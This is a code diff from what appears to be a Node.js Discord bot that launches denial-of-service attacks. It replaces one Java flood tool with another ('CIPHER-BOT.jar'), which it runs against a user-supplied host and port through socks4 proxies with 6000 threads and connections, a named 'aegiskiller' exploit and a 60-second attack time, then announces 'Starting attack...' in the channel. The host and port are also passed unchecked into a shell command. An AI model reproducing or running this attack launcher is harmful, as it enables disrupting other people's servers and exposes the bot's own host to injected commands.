@@ -20,7 +20,7 @@ var exec = require('child_process').exec
 
 
 
-exec('java -jar ultimate.jar host=' + host + ' port=' + port + ' proxiesFile=socks4.txt threads=5000 attackTime=60 exploit=join', (error, stdout, stderr) => {
+exec('java -jar CIPHER-BOT.jar host=' + host + ' port=' + port +  ' protocol=47 exploit=aegiskiller proxiesFile=socks4.txt srvResolve=false srvResolve2=false threads=6000 timeout=500 attackTime=60 connections=6000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true', (error, stdout, stderr) => {
 });
 
  message.channel.send("〔💥〕Starting attack...");
